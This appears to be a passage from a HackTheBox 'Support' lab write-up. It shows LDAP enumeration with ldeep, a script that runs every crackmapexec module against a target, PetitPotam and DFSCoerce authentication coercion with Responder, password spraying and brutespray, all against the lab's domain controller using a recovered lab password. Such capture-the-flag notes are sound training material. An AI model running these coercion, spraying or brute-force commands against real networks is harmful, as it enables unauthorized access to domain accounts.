So it seems to be unsolvable on windows according to [0xdf's writeup](https://0xdf.gitlab.io/2022/12/17/htb-support.html#beyond-root), but works on linux by using mono to run it ([Refer](https://0xdf.gitlab.io/2022/12/17/htb-support.html#recover-ldap-password))

![](/assets/obsidian/fb857c8397a3811d15842a8229eaa2be.png)

#### Linux

> Used [REMnux](https://remnux.org/)

Point the domain name to my IP in the VirtualBox NAT Network

```bash
root@remnux:/media/sf_Remnux# echo '10.0.2.5 support.htb' | sudo tee -a /etc/hosts
10.0.2.5 support.htb
```

Setup port forwarding on kali, so remnux VM can access the htb machine without connecting to htb lab VPN

```bash
socat tcp-listen:389,fork,reuseaddr tcp:10.129.81.110:389
```

```bash
socat udp-listen:53,fork,reuseaddr udp:10.129.81.110:53
```

All done now, start wireshark and listen on `ANY` interface, then start the Userinfo program

```bash
root@remnux:/media/sf_Remnux# ./UserInfo.exe user -username god
[-] Exception: No Such Object
```

![](/assets/obsidian/28265e85fdc40bcd208348cbb5a6c8df.png)

![](/assets/obsidian/f7a8a1c93e0509b332434f00562359e9.png)


## Query ldap deeper via ldeep

> Trying out this new tool : [ldeep](https://github.com/franc-pentest/ldeep), it's very fast dump **a lot** information

Fetch users

```bash
┌──(bravosec㉿fsociety)-[~/htb/Support]
└─$ ldeep ldap -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -d support.htb -s ldap://support.htb users
...
support
ldap
krbtgt
Guest
Administrator
```

Dump everything

```bash
mkdir -p ldeepdump
ldeep ldap -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -d support.htb -s ldap://support.htb all "ldeepdump/$DOMAIN"
```


## Automating Crackmapexec Modules

I was stuck at a stage and wonder if there were any common vulnerabilities since the box was rated as "Easy", so I made the script for **crackmapexec** to automate all available modules based on user specified protocols 

Though it's not a good practice to use in real red team engagement, but it's super fun to test in LABs

> cme_automation.sh

```bash

#!/bin/bash

# cme_oneliner.sh

# Usage: cme_oneliner.sh <rhost> <additional_args>

if [[ -z $1 ]]; then
  echo "Usage: cme_oneliner.sh <rhost> <additional_args>"
  exit 1
fi

rhost=$1
shift

cme_protocols=$(cme | grep 'available protocols' -A2 | grep '{' | sed 's/,/ /g' | tr -d '{}' | xargs)
echo "Choose one or more modules to run [Available Protocols : $cme_protocols]"

# Read user input
read -p "Protocols (Ex Format : ldap mssql smb) ~> " protocols

for proto in $protocols; do
  # modules_cmd=$(cme $proto -L|awk '{print $2}'|xargs|sed 's/ / -M /g')
  modules=$(cme $proto -L|awk '{print $2}'|xargs)
  for module in $modules; do
    CMD="cme $proto $rhost $* -M $module"
    echo '----------------------------------------'
    echo "[*] $CMD"
    echo '----------------------------------------'
    $CMD
  done
done
```

![](/assets/obsidian/2acd610276740d4e9e273df3dba70b65.png)

![](/assets/obsidian/d0aaaed8dfb9dd5010357a96e5631e23.png)


## Coerce Authentication


### MS-EFSRPC

```bash
[*] cme smb support.htb -u ldap -p nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz -M petitpotam
SMB         10.129.227.255  445    DC               [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)
SMB         10.129.227.255  445    DC               [+] support.htb\ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
PETITPOT... 10.129.227.255  445    DC               VULNERABLE
PETITPOT... 10.129.227.255  445    DC               Next step: https://github.com/topotam/PetitPotam
```

```bash
sudo responder -A -I tun1 -v
```

```bash
python /opt/sectools/ad/PetitPotam/PetitPotam.py -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -d support.htb 10.10.16.13 10.129.227.255
```

![](/assets/obsidian/85d161eae8d4189330c57e85ba8114f8.png)


### MS-DFSNM 

```bash
[*] cme smb support.htb -u ldap -p nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz -M dfscoerce
SMB         10.129.227.255  445    DC               [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)
SMB         10.129.227.255  445    DC               [+] support.htb\ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
DFSCOERC... 10.129.227.255  445    DC               VULNERABLE
DFSCOERC... 10.129.227.255  445    DC               Next step: https://github.com/Wh04m1001/DFSCoerce
```

```bash
sudo responder -A -I tun1 -v
```

```bash
python dfscoerce.py -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -d support.htb 10.10.16.13 10.129.227.255
```

![](/assets/obsidian/d903fb19891ab548584d0cab6c917148.png)


## Failed Attamps


### Password spray

```bash
┌──(bravosec㉿fsociety)-[~/htb/Support]
└─$ mkdir bloodhound-result

┌──(bravosec㉿fsociety)-[~/htb/Support]
└─$ cd bloodhound-result

┌──(bravosec㉿fsociety)-[~/htb/Support/bloodhound-result]
└─$ unzip -l ../DC_10.129.227.255_2023-09-27_123856bloodhound.zip
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Support/bloodhound-result]
└─$ cat 2023-09-27_123858_users.json | jq .data[].Properties.samaccountname -r
null
ford.victoria
stoll.rachelle
langley.lucy
daughtler.mabel
west.laura
cromwell.gerard
monroe.david
raven.clifton
bardot.mary
levine.leopoldo
thomas.raphael
anderson.damian
wilson.shelby
smith.rosario
hernandez.stanley
krbtgt
ldap
support
Guest
Administrator

┌──(bravosec㉿fsociety)-[~/htb/Support/bloodhound-result]
└─$ vi ad_users.txt
```

Nothing found

```bash
┌──(bravosec㉿fsociety)-[~/htb/Support/bloodhound-result]]
└─$ cme smb support.htb -u ad_users.txt -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
```


### Brute Force common credentials

```bash
┌──(bravosec㉿fsociety)-[~/htb/Support]
└─$ mkdir -p brutespray-output; inotifywait --monitor -e create,modify brutespray-output
Setting up watches.
Watches established.
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Support]
└─$ brutespray -f nmap/all_tcp_ports.gnmap -t 50 -T 5
```